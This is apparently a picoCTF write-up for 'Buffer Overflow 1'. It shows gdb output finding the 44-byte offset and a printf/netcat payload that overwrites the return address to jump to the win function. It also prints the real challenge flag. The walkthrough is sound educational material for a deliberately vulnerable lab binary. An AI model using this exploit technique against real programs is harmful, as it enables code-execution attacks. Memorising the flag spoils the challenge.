# Buffer Overflow 1


## Description

Control the return address.

Now we're cooking! You can overflow the buffer and return to the flag function in the [program](https://artifacts.picoctf.net/c/250/vuln).

You can view source [here](https://artifacts.picoctf.net/c/250/vuln.c). And connect with it using 

```bash
nc saturn.picoctf.net 50916
```

## Preface

Reading the source code, we needed to ensure that we have a flag locally that we use to debug:

```bash
echo "picoCTF{some_flag}" > flag.txt
```


## Exploitation

Sent 50 `U` as payload, we can see that the return address was overwritten:
```
(gdb) r
Starting program: vuln 
Please enter your string: 
UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU

Breakpoint 1, 0x080492a3 in vuln ()
(gdb) c
Continuing.
Okay, time to return... Fingers Crossed... Jumping to 0x55555555

Program received signal SIGSEGV, Segmentation fault.
0x55555555 in ?? ()
```

Trying again with 44 `U` and `1234`, we can see that we now control the return address:

```
(gdb) r
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: vuln 
Please enter your string: 
UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU1234

Breakpoint 1, 0x080492a3 in vuln ()
(gdb) c
Continuing.
Okay, time to return... Fingers Crossed... Jumping to 0x34333231

Program received signal SIGSEGV, Segmentation fault.
0x34333231 in ?? ()
```

## Finding the Return Address

To find the return address, we need to look at where at the address where the `win` function starts since we want the program to jump there when it finishes executing the `vuln` function:










Converting the calling address of the `win` function together with the fuzzing, we're able to get the flag:

```bash
printf "UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU\xf6\x91\x04\x08" | ./vuln
Please enter your string: 
Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
picoCTF{some_flag}
[1]    57020 done                              printf "UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU\xf6\x91\x04\x08" | 
       57021 segmentation fault (core dumped)  ./vuln

```



To get the flag from the remote server:
```bash
cat <(printf "UUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUU\xf6\x91\x04\x08") - | nc saturn.picoctf.net 58677
Please enter your string: 

Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
picoCTF{addr3ss3s_ar3_3asy_ad2f467b}
```





